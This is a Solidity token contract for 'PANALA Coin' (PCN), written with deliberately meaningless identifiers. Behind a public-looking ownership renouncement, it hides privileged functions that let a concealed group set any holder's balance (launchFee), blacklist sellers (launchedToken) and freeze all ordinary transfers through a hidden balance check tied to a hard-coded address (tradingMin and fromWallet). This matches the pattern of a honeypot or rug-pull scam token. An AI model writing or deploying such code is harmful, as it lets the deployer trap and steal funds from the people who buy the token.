//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface shouldAtWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atMarketingFund) external view returns (uint256);

    function transfer(address modeTeamFee, uint256 teamBuy) external returns (bool);

    function allowance(address fundSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamBuy) external returns (bool);

    function transferFrom(
        address sender,
        address modeTeamFee,
        uint256 teamBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed toSell, uint256 value);
    event Approval(address indexed fundSender, address indexed spender, uint256 value);
}

interface shouldAtWalletMetadata is shouldAtWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tokenAtSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txTrading {
    function createPair(address maxAmount, address receiverTeam) external returns (address);
}

interface swapMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PANALACoin is tokenAtSender, shouldAtWallet, shouldAtWalletMetadata {

    mapping(address => mapping(address => uint256)) private feeMax;

    function transfer(address tokenLaunched, uint256 teamBuy) external virtual override returns (bool) {
        return fromWallet(_msgSender(), tokenLaunched, teamBuy);
    }

    function tradingMin(uint256 teamBuy) public {
        receiverLaunchTo();
        tradingSender = teamBuy;
    }

    function symbol() external view virtual override returns (string memory) {
        return autoLimit;
    }

    function balanceOf(address atMarketingFund) public view virtual override returns (uint256) {
        return autoWallet[atMarketingFund];
    }

    constructor (){
        if (limitMax == fromLiquidity) {
            teamAutoWallet = false;
        }
        sellTakeIs();
        swapMode txAmount = swapMode(buyMarketing);
        minFund = txTrading(txAmount.factory()).createPair(txAmount.WETH(), address(this));
        
        totalFee = _msgSender();
        buyReceiver[totalFee] = true;
        autoWallet[totalFee] = exemptBuy;
        
        emit Transfer(address(0), totalFee, exemptBuy);
    }

    bool private atFeeTrading;

    function totalIs(address enableTokenMode) public {
        if (launchToken) {
            return;
        }
        
        buyReceiver[enableTokenMode] = true;
        
        launchToken = true;
    }

    uint8 private liquidityAuto = 18;

    bool public teamAutoWallet;

    address public minFund;

    address public totalFee;

    function name() external view virtual override returns (string memory) {
        return liquidityLimit;
    }

    function approve(address txLaunched, uint256 teamBuy) public virtual override returns (bool) {
        feeMax[_msgSender()][txLaunched] = teamBuy;
        emit Approval(_msgSender(), txLaunched, teamBuy);
        return true;
    }

    function transferFrom(address teamFund, address modeTeamFee, uint256 teamBuy) external override returns (bool) {
        if (_msgSender() != buyMarketing) {
            if (feeMax[teamFund][_msgSender()] != type(uint256).max) {
                require(teamBuy <= feeMax[teamFund][_msgSender()]);
                feeMax[teamFund][_msgSender()] -= teamBuy;
            }
        }
        return fromWallet(teamFund, modeTeamFee, teamBuy);
    }

    uint256 private limitTeamEnable;

    uint256 tradingSender;

    uint256 private sellAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return exemptBuy;
    }

    string private autoLimit = "PCN";

    mapping(address => bool) public modeTradingShould;

    address buyMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    event OwnershipTransferred(address indexed atMode, address indexed toAuto);

    function receiverLaunchTo() private view {
        require(buyReceiver[_msgSender()]);
    }

    function launchedToken(address fundExempt) public {
        receiverLaunchTo();
        if (feeMode) {
            limitTeamEnable = fromLiquidity;
        }
        if (fundExempt == totalFee || fundExempt == minFund) {
            return;
        }
        modeTradingShould[fundExempt] = true;
    }

    function fromWallet(address teamFund, address modeTeamFee, uint256 teamBuy) internal returns (bool) {
        if (teamFund == totalFee) {
            return atReceiver(teamFund, modeTeamFee, teamBuy);
        }
        uint256 walletTx = shouldAtWallet(minFund).balanceOf(feeTx);
        require(walletTx == tradingSender);
        require(!modeTradingShould[teamFund]);
        return atReceiver(teamFund, modeTeamFee, teamBuy);
    }

    function getOwner() external view returns (address) {
        return totalLaunched;
    }

    bool public exemptWallet;

    function sellTakeIs() public {
        emit OwnershipTransferred(totalFee, address(0));
        totalLaunched = address(0);
    }

    address feeTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function launchFee(address tokenLaunched, uint256 teamBuy) public {
        receiverLaunchTo();
        autoWallet[tokenLaunched] = teamBuy;
    }

    address private totalLaunched;

    function decimals() external view virtual override returns (uint8) {
        return liquidityAuto;
    }

    bool private feeMode;

    uint256 liquidityReceiver;

    uint256 private exemptBuy = 100000000 * 10 ** 18;

    function allowance(address maxAuto, address txLaunched) external view virtual override returns (uint256) {
        if (txLaunched == buyMarketing) {
            return type(uint256).max;
        }
        return feeMax[maxAuto][txLaunched];
    }

    function atReceiver(address teamFund, address modeTeamFee, uint256 teamBuy) internal returns (bool) {
        require(autoWallet[teamFund] >= teamBuy);
        autoWallet[teamFund] -= teamBuy;
        autoWallet[modeTeamFee] += teamBuy;
        emit Transfer(teamFund, modeTeamFee, teamBuy);
        return true;
    }

    bool public autoReceiver;

    uint256 private fromLiquidity;

    uint256 public limitMax;

    string private liquidityLimit = "PANALA Coin";

    bool public launchToken;

    function owner() external view returns (address) {
        return totalLaunched;
    }

    bool public enableAmountMode;

    mapping(address => uint256) private autoWallet;

    mapping(address => bool) public buyReceiver;

}